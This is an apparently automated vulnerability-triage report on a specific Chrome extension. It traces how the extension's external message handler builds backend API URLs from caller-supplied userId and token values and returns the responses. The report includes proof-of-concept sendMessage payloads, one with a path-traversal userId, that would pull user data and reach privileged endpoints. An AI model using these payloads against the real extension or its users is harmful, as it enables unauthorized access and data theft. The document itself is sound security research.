# CoCo Analysis: kmjgiccaafpjcdplhbopodmckegjbimo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 40+ (multiple instances of similar flows)

---

## Sink 1: bg_chrome_runtime_MessageExternal → jQuery_ajax_settings_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kmjgiccaafpjcdplhbopodmckegjbimo/opgen_generated_files/bg.js
Line 8359 "user_id": params.data.userId,
Line 8360 "token": params.data.token,
Line 8309 get(Urls.URL + Urls.CONNEXIONS + Urls.CHECK_TOKEN_VALIDITY + app.config.CLIENT_KEY + "/" + app.config.API_KEY + "/" + params.data.userId + "/" + params.data.token, ...)

**Code:**

```javascript
// bg.js - Lines 9145-9146: External message listener
chrome.runtime.onMessage.addListener(onMessage);
chrome.runtime.onMessageExternal.addListener(onMessage); // ← Accepts messages from ANY external source

// Lines 10096-10102: Message handler
function onMessage(request, sender, sendResponse) {
    if (request.event) {
        if (request.event === "API")
            callApi(request, sendResponse); // ← Routes to API calls
        else if (request.event === "BACK")
            methods[request.method](request, onSuccess, onError);
    }
}

// Lines 10085-10087: API call dispatcher
function callApi(request, sendResponse) {
    app.api.call(request.method, request, sendResponse); // ← Calls API with attacker data
}

// Lines 8308-8313: checkToken function (one of many vulnerable endpoints)
function checkToken (params) {
    get(
      Urls.URL + Urls.CONNEXIONS + Urls.CHECK_TOKEN_VALIDITY +
      app.config.CLIENT_KEY + "/" + app.config.API_KEY + "/" +
      params.data.userId + "/" + params.data.token, // ← Attacker-controlled URL path
      {},
      params._success, params._error, params._complete);
}

// Lines 9019-9027: Success handler sends response back
function onSuccess (data) {
    var response = {
        data  : data, // ← Backend response data
        result: true
    };

    if (sendResponse !== null) {
        sendResponse(response); // ← Sends backend data back to attacker
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious extension or whitelisted website sends external message
chrome.runtime.sendMessage(
  "kmjgiccaafpjcdplhbopodmckegjbimo",
  {
    event: "API",
    method: "checkToken",
    data: {
      userId: "../../../../../../etc/passwd", // Path traversal attempt
      token: "malicious"
    }
  },
  function(response) {
    console.log("Backend response:", response.data);
    // Attacker receives response from backend API
  }
);

// Or trigger other vulnerable endpoints:
// - getUserStats, getFriendsStats, searchByPattern, getNotificationsFor, etc.
// All accept attacker-controlled params.data.userId, params.data.token
// and construct URLs with them
```

**Impact:** Multiple critical vulnerabilities: (1) **SSRF with Path Injection** - Attacker can manipulate URL paths by injecting malicious userId/token values to access unintended API endpoints on the developer's backend server (https://datarmine.com/), (2) **Information Disclosure** - Backend API responses are sent back to the attacker via sendResponse, potentially leaking sensitive user data including stats, notifications, friends lists, and authentication tokens, (3) **API Abuse** - Attacker can invoke privileged API operations like changePassword, updateAvatar, setPayback using crafted requests. The extension accepts messages from ANY external source via onMessageExternal without origin validation.

---

## Sink 2: jQuery_ajax_result_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kmjgiccaafpjcdplhbopodmckegjbimo/opgen_generated_files/bg.js
Line 291 var jQuery_ajax_result_source = 'data_form_jq_ajax';

**Code:**

```javascript
// This is the same vulnerability as Sink 1, but CoCo detected the reverse flow:
// Backend response (jQuery_ajax_result_source) → sendResponse to attacker

// Lines 9019-9027: Success handler
function onSuccess (data) {
    var response = {
        data  : data, // ← data from jQuery.ajax response
        result: true
    };

    if (sendResponse !== null) {
        sendResponse(response); // ← Leak to external attacker
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message

**Attack:**

```javascript
// Same as Sink 1 - attacker triggers API call and receives backend response
chrome.runtime.sendMessage(
  "kmjgiccaafpjcdplhbopodmckegjbimo",
  {
    event: "API",
    method: "getUserStats",
    data: {
      userId: "123",
      token: "stolen_or_guessed_token"
    }
  },
  function(response) {
    console.log("Leaked user stats:", response.data);
  }
);
```

**Impact:** Information disclosure - Backend API responses containing sensitive user data (statistics, notifications, friends, tokens) are leaked to external attackers via sendResponse.

---

## Sink 3: jQuery_ajax_result_source → bg_localStorage_setItem_value_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kmjgiccaafpjcdplhbopodmckegjbimo/opgen_generated_files/bg.js
Line 291 var jQuery_ajax_result_source = 'data_form_jq_ajax';
Line 7818 value = JSON.stringify(value);

**Code:**

```javascript
// Lines 7818: Backend response stored in localStorage
value = JSON.stringify(value); // Stores jQuery.ajax response
```

**Classification:** FALSE POSITIVE

**Reason:** While backend responses are stored in localStorage, this is incomplete storage exploitation. The stored data comes from the developer's own backend (https://datarmine.com/) which is trusted infrastructure. Although the attacker can trigger these API calls, storing responses from the developer's backend in localStorage doesn't constitute a vulnerability by itself - it's normal extension functionality to cache backend responses. This is different from storage poisoning where attacker-controlled data is stored and later retrieved in a harmful way.

---
